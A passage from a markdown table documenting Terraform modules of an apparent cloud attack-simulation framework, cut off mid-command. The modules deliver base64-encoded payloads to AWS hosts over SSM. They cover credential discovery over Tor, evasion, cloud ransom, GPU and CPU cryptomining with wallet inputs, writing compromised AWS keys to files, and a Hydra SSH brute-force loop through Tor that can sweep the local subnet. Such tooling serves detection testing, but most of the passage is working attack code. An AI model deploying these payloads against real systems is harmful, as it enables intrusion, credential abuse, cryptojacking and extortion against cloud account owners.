"$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/discovery\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    evasion     = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/evasion\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudransom = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudransom\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudcrypto = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto\.tf\.tpl",<br/>                                \{<br/>                                    name = "crypto\-gpu\-miner\-$\{var\.inputs\["environment"\]\}\-$\{var\.inputs\["deployment"\]\}"<br/>                                    instances = 12<br/>                                    wallet = var\.inputs\["ethermine\_wallet"\]<br/>                                    region = var\.inputs\["region"\]<br/>                                \}<br/>                            \)<br/>    hostcrypto  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/hostcrypto\.tf\.tpl",<br/>                                \{<br/>                                    name = "host\-cpu\-miner\-$\{var\.inputs\["environment"\]\}\-$\{var\.inputs\["deployment"\]\}"<br/>                                    region = var\.inputs\["region"\]<br/>                                    instances = 1<br/>                                    minergate\_user = var\.inputs\["minergate\_user"\]<br/>                                    nicehash\_user = var\.inputs\["nicehash\_user"\]<br/>                                \}<br/>                            \)<br/>    <br/>    terraform  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/terraform\.sh\.tpl",<br/>                                \{<br/>                                \}<br/>                            \)<br/>    <br/>    start       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/start\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = "git"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = "git"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_auto\-free\.sh"<br/>                content = base64encode\(local\.auto\-free\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_auto\-paid\.sh"<br/>                content = base64encode\(local\.auto\-paid\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_baseline\.sh"<br/>                content = base64encode\(local\.baseline\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_discovery\.sh"<br/>                content = base64encode\(local\.discovery\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_evasion\.sh"<br/>                content = base64encode\(local\.evasion\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_cloudransom\.sh"<br/>                content = base64encode\(local\.cloudransom\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_terraform\.sh"<br/>                content = base64encode\(local\.terraform\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_start\.sh"<br/>                content = base64encode\(local\.start\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre>         |
| attacker-ssm-execute-docker-composite-guardduty                            | ./modules/ssm/execute-docker-composite-guardduty               | ssm_exec_docker_guardduty                  | context.aws.ssm.attacker.execute.docker_composite_guardduty               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_guardduty": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-guardduty               | <pre>locals \{<br/>    attack\_dir = "/guardduty"<br/>    attack\_script = "discovery\_aws\_instance\_creds\_tor\.sh"<br/>    start\_script = "discovery\_delayed\_start\.sh"<br/>    payload = <<\-EOT<br/>    log "removing previous app directory"<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    log "creating app directory"<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    echo $\{base64gzip\(local\.discovery\)\} \| base64 \-d \| gunzip > $\{local\.attack\_script\}<br/>    echo $\{base64gzip\(local\.start\)\} \| base64 \-d \| gunzip > $\{local\.start\_script\}<br/>    log "starting script\.\.\."<br/>    /bin/bash $\{local\.start\_script\}<br/>    <br/>    log "done\."<br/>    EOT<br/><br/>    discovery       = file\(<br/>                                "$\{path\.module\}/resources/$\{local\.attack\_script\}", <br/>                            \)<br/>    start           = templatefile\(<br/>                                "$\{path\.module\}/resources/$\{local\.start\_script\}",<br/>                                \{<br/>                                    attack\_delay = var\.inputs\["attack\_delay"\]<br/>                                    attack\_dir = local\.attack\_dir<br/>                                    attack\_script = local\.attack\_script<br/>                                \} <br/>                            \)<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_discovery\.sh"<br/>                content = base64encode\(local\.discovery\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_start\.sh"<br/>                content = base64encode\(local\.start\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-simulation-attacker-exec-docker-composite-host-cryptomining       | ./modules/ssm/execute-docker-composite-host-cryptomining       | ssm_exec_docker_host_cryptomining          | context.aws.ssm.attacker.execute.docker_composite_host_cryptomining       | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_host_cryptomining": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-host-cryptomining       | <pre>locals \{<br/>    attack\_dir = "/cloud\-tunnel"<br/>    script = "hostcrypto"<br/>    script\_type = "terraform"<br/>    attack\_type = "host\_cryptomining"<br/>    aws\_creds = join\("\\n", \[ for u,k in var\.inputs\["compromised\_credentials"\]: "echo '$\{k\.rendered\}' > $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}" \]\)<br/>    payload = <<\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\} $\{local\.attack\_dir\}/aws\-cli/scripts $\{local\.attack\_dir\}/terraform/scripts/cloudcrypto $\{local\.attack\_dir\}/terraform/scripts/hostcrypto $\{local\.attack\_dir\}/protonvpn<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    echo '$\{base64gzip\(local\.start\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/start\.sh<br/>    echo '$\{base64gzip\(local\.auto\-free\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/auto\-free\.sh<br/>    echo '$\{base64gzip\(local\.auto\-paid\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/auto\-paid\.sh<br/>    echo '$\{base64gzip\(local\.protonvpn\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn<br/>    echo '$\{base64gzip\(local\.protonvpn\-paid\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn\-paid<br/>    echo '$\{base64gzip\(local\.protonvpn\-baseline\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn\-baseline<br/>    echo '$\{base64gzip\(local\.baseline\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/baseline\.sh<br/>    echo '$\{base64gzip\(local\.discovery\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/discovery\.sh<br/>    echo '$\{base64gzip\(local\.evasion\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/evasion\.sh<br/>    echo '$\{base64gzip\(local\.cloudransom\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/cloudransom\.sh<br/>    echo '$\{base64gzip\(local\.cloudcrypto\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/main\.tf<br/>    echo '$\{base64gzip\(local\.terraform\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/terraform\.sh<br/>    echo '$\{base64gzip\(local\.hostcrypto\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/main\.tf<br/>    echo '$\{base64gzip\(local\.terraform\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/terraform\.sh<br/>    log "Starting as background job\.\.\."<br/>    if \[ "$\{var\.inputs\["protonvpn\_tier"\]\}" == "0" \]; then<br/>        for i in $\(echo "US NL\-FREE\#1 JP\-FREE\#3 NL\-FREE\#4 NL\-FREE\#8 US\-FREE\#5 NL\-FREE\#9 NL\-FREE\#12 NL\-FREE\#13 NL\-FREE\#14 NL\-FREE\#15 NL\-FREE\#16 US\-FREE\#13 US\-FREE\#32 US\-FREE\#33 US\-FREE\#34 NL\-FREE\#39 NL\-FREE\#52 NL\-FREE\#57 NL\-FREE\#87 NL\-FREE\#133 NL\-FREE\#136 NL\-FREE\#148 US\-FREE\#52 US\-FREE\#53 US\-FREE\#54 US\-FREE\#51 NL\-FREE\#163 NL\-FREE\#164 US\-FREE\#58 US\-FREE\#57 US\-FREE\#56 US\-FREE\#55"\); do cp \.env\-protonvpn \.env\-protonvpn\-$i; sed \-i "s/RANDOM/$i/" \.env\-protonvpn\-$i; done<br/>        bash auto\-free\.sh<br/>    else<br/>        for i in $\(echo "AU CR IS JP LV NL NZ SG SK US"\); do cp \.env\-protonvpn\-paid \.env\-protonvpn\-paid\-$i; sed \-i "s/RANDOM/$i/" \.env\-protonvpn\-paid\-$i; done<br/>        bash auto\-paid\.sh<br/>    fi;<br/>    log "Done\."<br/>    EOT<br/><br/>    protonvpn       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = var\.inputs\["protonvpn\_server"\]<br/>                                    protonvpn\_tier = tostring\(var\.inputs\["protonvpn\_tier"\]\)<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    protonvpn\-paid       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = var\.inputs\["protonvpn\_server"\]<br/>                                    protonvpn\_tier = 2<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    protonvpn\-baseline  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = "US"<br/>                                    protonvpn\_tier = tostring\(var\.inputs\["protonvpn\_tier"\]\)<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    auto\-free   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-free\.sh\.tpl",<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\["compromised\_keys\_user"\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\["attack\_delay"\]<br/>                                \}<br/>                            \)<br/>    auto\-paid   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-paid\.sh\.tpl",<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\["compromised\_keys\_user"\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\["attack\_delay"\]<br/>                                \}<br/>                            \)<br/>    baseline    = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/baseline\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    discovery   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/discovery\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    evasion     = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/evasion\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudransom = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudransom\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudcrypto = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto\.tf\.tpl",<br/>                                \{<br/>                                    name = "crypto\-gpu\-miner\-$\{var\.inputs\["environment"\]\}\-$\{var\.inputs\["deployment"\]\}"<br/>                                    instances = 12<br/>                                    wallet = var\.inputs\["ethermine\_wallet"\]<br/>                                    region = var\.inputs\["region"\]<br/>                                \}<br/>                            \)<br/>    hostcrypto  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/hostcrypto\.tf\.tpl",<br/>                                \{<br/>                                    name = "host\-cpu\-miner\-$\{var\.inputs\["environment"\]\}\-$\{var\.inputs\["deployment"\]\}"<br/>                                    region = var\.inputs\["region"\]<br/>                                    instances = 1<br/>                                    minergate\_user = var\.inputs\["minergate\_user"\]<br/>                                    nicehash\_user = var\.inputs\["nicehash\_user"\]<br/>                                \}<br/>                            \)<br/>    <br/>    terraform  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/terraform\.sh\.tpl",<br/>                                \{<br/>                                \}<br/>                            \)<br/>    <br/>    start       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/start\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_auto\-free\.sh"<br/>                content = base64encode\(local\.auto\-free\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_auto\-paid\.sh"<br/>                content = base64encode\(local\.auto\-paid\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_baseline\.sh"<br/>                content = base64encode\(local\.baseline\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_discovery\.sh"<br/>                content = base64encode\(local\.discovery\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_evasion\.sh"<br/>                content = base64encode\(local\.evasion\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_cloudransom\.sh"<br/>                content = base64encode\(local\.cloudransom\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_terraform\.sh"<br/>                content = base64encode\(local\.terraform\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_start\.sh"<br/>                content = base64encode\(local\.start\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre>                       |
| attacker-ssm-execute-docker-hydra                                          | ./modules/ssm/execute-docker-hydra                             | ssm_exec_docker_hydra_attacker             | context.aws.ssm.attacker.execute.docker_hydra                             | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_hydra": {<br/>                            "attack_delay": 50400,<br/>                            "custom_password_list": [],<br/>                            "custom_user_list": [],<br/>                            "enabled": false,<br/>                            "password_list": "/opt/passwords/darkweb2017-top10.txt",<br/>                            "scan_local_network": false,<br/>                            "targets": [],<br/>                            "use_tor": true,<br/>                            "user_list": "/opt/usernames/top-usernames-shortlist.txt"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-hydra                             | <pre>locals \{<br/>    attack\_dir = "/hydra"<br/>    targets = flatten\(\[ for target in var\.inputs\["targets"\]: can\(split\("/", target\)\[1\]\) ? <br/>        \[ for host\_number in range\(pow\(2, 32 \- split\("/", target\)\[1\]\)\) : cidrhost\(target, host\_number\) \]<br/>        :<br/>        \[ target \]<br/>    \]\)<br/>    base64\_command\_payload = var\.inputs\["payload"\]<br/>    payload = <<\-EOT<br/>    \# Function to convert IP address to decimal<br/>    ip\_to\_dec\(\) \{<br/>        local IFS=\.<br/>        read ip1 ip2 ip3 ip4 <<< "$1"<br/>        echo "$\(\(ip1 \* 16777216 \+ ip2 \* 65536 \+ ip3 \* 256 \+ ip4\)\)"<br/>    \}<br/><br/>    \# Function to convert decimal to IP address<br/>    dec\_to\_ip\(\) \{<br/>        local ip dec=$1<br/>        for e in \{3\.\.0\}; do<br/>            \(\(octet = dec / \(256 \*\* e\) \)\)<br/>            \(\(dec \-= octet \* 256 \*\* e\)\)<br/>            ip\+="$$\{octet\}\."<br/>        done<br/>        echo "$$\{ip%?\}"<br/>    \}<br/><br/>    \# Main function to generate IP list from CIDR<br/>    generate\_ips\(\) \{<br/>        local cidr="$1"<br/>        local ip="$$\{cidr%/\*\}"<br/>        local prefix="$$\{cidr\#\*/\}"<br/>        local netmask=$\(\(0xffffffff ^ \(\(1 << \(32 \- prefix\)\) \- 1\)\)\)<br/><br/>        local start=$\(ip\_to\_dec "$ip"\)<br/>        local start=$\(\(start & netmask\)\)<br/>        local end=$\(\(start \| \(\(1 << \(32 \- prefix\)\) \- 1\)\)\)<br/><br/>        for \(\(ip= start; ip <= end; ip\+\+\)\); do<br/>            dec\_to\_ip "$ip"<br/>        done<br/>    \}<br/><br/>    log "cleaning app directory"<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting script\.\.\."<br/>        LOCAL\_NET=$\(ip \-o \-f inet addr show \| awk '/scope global/ \{print $4\}' \| head \-1\)<br/>        log "LOCAL\_NET: $LOCAL\_NET"<br/>        log "Targets: $\{join\(",", local\.targets\)\}"<br/>        echo "$\{ length\(local\.targets\) > 0 ? join\("\\n", local\.targets\) : "$\(generate\_ips $LOCAL\_NET\)" \}" > /tmp/hydra\-targets\.txt<br/>        cat > /tmp/hydra\-users\.txt <<'EOF'<br/>    $\{try\(length\(var\.inputs\["ssh\_user"\]\.username\),"false"\) \!= "false" ? var\.inputs\["ssh\_user"\]\.username : "root" \}<br/>    EOF<br/>        cat > /tmp/hydra\-passwords\.txt <<'EOF'<br/>    123456<br/>    123456789<br/>    111111<br/>    password<br/>    qwerty<br/>    abc123<br/>    12345678<br/>    password1<br/>    1234567<br/>    123123<br/>    $\{try\(length\(var\.inputs\["ssh\_user"\]\.password\),"false"\) \!= "false" ? var\.inputs\["ssh\_user"\]\.password : "" \}<br/>    EOF<br/>        if sudo docker ps \-a \| grep $\{var\.inputs\["container\_name"\]\}; then <br/>        sudo docker stop $\{var\.inputs\["container\_name"\]\}<br/>        sudo docker rm $\{var\.inputs\["container\_name"\]\}<br/>        fi<br/>        truncate \-s 0 /tmp/hydra\-found\.txt<br/>        $\{ var\.inputs\["use\_tor"\] == true ? <<\-EOF<br/>        log "Using tor network\.\.\."<br/>        if \! docker ps \| grep torproxy > /dev/null; then<br/>        sudo docker run \-d \-\-rm \-\-name torproxy \-p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$\(docker inspect \-f '\{\{range \.NetworkSettings\.Networks\}\}\{\{\.IPAddress\}\}\{\{end\}\}' torproxy\)<br/>        log "Running: proxychains hydra \-V \-L $\{var\.inputs\["user\_list"\]\} \-P $\{var\.inputs\["password\_list"\]\} \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh"<br/>        sudo /bin/bash \-c "docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\["container\_name"\]\} $\{var\.inputs\["image"\]\} hydra \-V \-L $\{var\.inputs\["user\_list"\]\} \-P $\{var\.inputs\["password\_list"\]\} \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true"<br/>        sudo /bin/bash \-c "docker logs $\{var\.inputs\["container\_name"\]\} >> $LOGFILE 2>&1"<br/>        sudo /bin/bash \-c "docker rm $\{var\.inputs\["container\_name"\]\}"<br/>        log "Running: proxychains hydra \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh"<br/>        sudo /bin/bash \-c "docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\["container\_name"\]\} $\{var\.inputs\["image"\]\} hydra \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true"<br/>        sudo /bin/bash \-c "docker logs $\{var\.inputs\["container\_name"\]\} >> $LOGFILE 2>&1"<br/>        sudo /bin/bash \-c "docker rm $\{var\.inputs\["container\_name"\]\}"<br/>        EOF<br/>        : <<\-EOF<br/>        log "Running: hydra \-V \-L $\{var\.inputs\["user\_list"\]\} \-P $\{var\.inputs\["password\_list"\]\} \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh"<br/>        sudo /bin/bash \-c "docker run \-v /tmp:/tmp \-\-entrypoint=hydra \-\-name $\{var\.inputs\["container\_name"\]\} $\{var\.inputs\["image"\]\} \-V \-L $\{var\.inputs\["user\_list"\]\} 